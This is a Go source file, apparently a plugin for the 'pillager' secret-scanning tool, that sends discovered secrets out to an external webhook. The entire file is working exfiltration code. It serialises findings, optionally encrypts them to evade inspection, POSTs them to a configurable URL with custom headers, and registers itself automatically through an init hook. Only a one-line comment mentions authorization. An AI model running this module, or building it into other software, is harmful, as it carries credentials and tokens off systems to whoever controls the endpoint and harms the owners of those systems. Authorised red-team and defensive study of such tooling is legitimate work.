package webhook

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
)

// WebhookExfiltrator exfiltrates findings via HTTP webhook.
//
// Supports:
// - Generic HTTP POST callbacks
// - Custom headers (e.g., authentication)
// - JSON payload
//
// WARNING: Ensure you have authorization before exfiltrating data.
type WebhookExfiltrator struct {
	url           string
	headers       map[string]string
	encryptionKey []byte
	compress      bool
	client        *http.Client
}

// NewWebhookExfiltrator creates a new webhook exfiltrator.
func NewWebhookExfiltrator(cfg exfil.Config) (*WebhookExfiltrator, error) {
	url := cfg.Options["url"]
	if url == "" {
		return nil, fmt.Errorf("webhook url is required")
	}

	// Parse headers from options
	headers := make(map[string]string)
	for key, value := range cfg.Options {
		if key != "url" && key != "timeout" {
			headers[key] = value
		}
	}

	// Default to JSON content type
	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/json"
	}

	// Load encryption key if provided
	var encryptionKey []byte
	var err error
	if cfg.EncryptionKey != "" {
		encryptionKey, err = exfil.LoadEncryptionKey(cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to load encryption key: %w", err)
		}
	}

	// Create HTTP client with timeout
	timeout := 30 * time.Second
	if timeoutStr, ok := cfg.Options["timeout"]; ok {
		if parsedTimeout, err := time.ParseDuration(timeoutStr); err == nil {
			timeout = parsedTimeout
		}
	}

	return &WebhookExfiltrator{
		url:           url,
		headers:       headers,
		encryptionKey: encryptionKey,
		compress:      cfg.Compress,
		client: &http.Client{
			Timeout: timeout,
		},
	}, nil
}

// Exfiltrate sends findings to the webhook URL.
func (w *WebhookExfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	if len(findings) == 0 {
		return nil
	}

	// Serialize findings to JSON
	data, err := exfil.SerializeFindings(findings)
	if err != nil {
		return fmt.Errorf("failed to serialize findings: %w", err)
	}

	// Encrypt if key is provided
	if w.encryptionKey != nil {
		data, err = exfil.Encrypt(data, w.encryptionKey)
		if err != nil {
			return fmt.Errorf("failed to encrypt data: %w", err)
		}
		// Change content type for encrypted data
		w.headers["Content-Type"] = "application/octet-stream"
	}

	// Create HTTP request
	req, err := http.NewRequestWithContext(ctx, "POST", w.url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Set headers
	for key, value := range w.headers {
		req.Header.Set(key, value)
	}

	// Send request
	resp, err := w.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send webhook: %w", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("webhook returned error status: %d", resp.StatusCode)
	}

	return nil
}

// Close cleanly shuts down the exfiltrator.
func (w *WebhookExfiltrator) Close() error {
	w.client.CloseIdleConnections()
	return nil
}

// init registers the webhook exfiltrator with the registry.
func init() {
	exfil.Register("webhook", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewWebhookExfiltrator(cfg)
	})
}
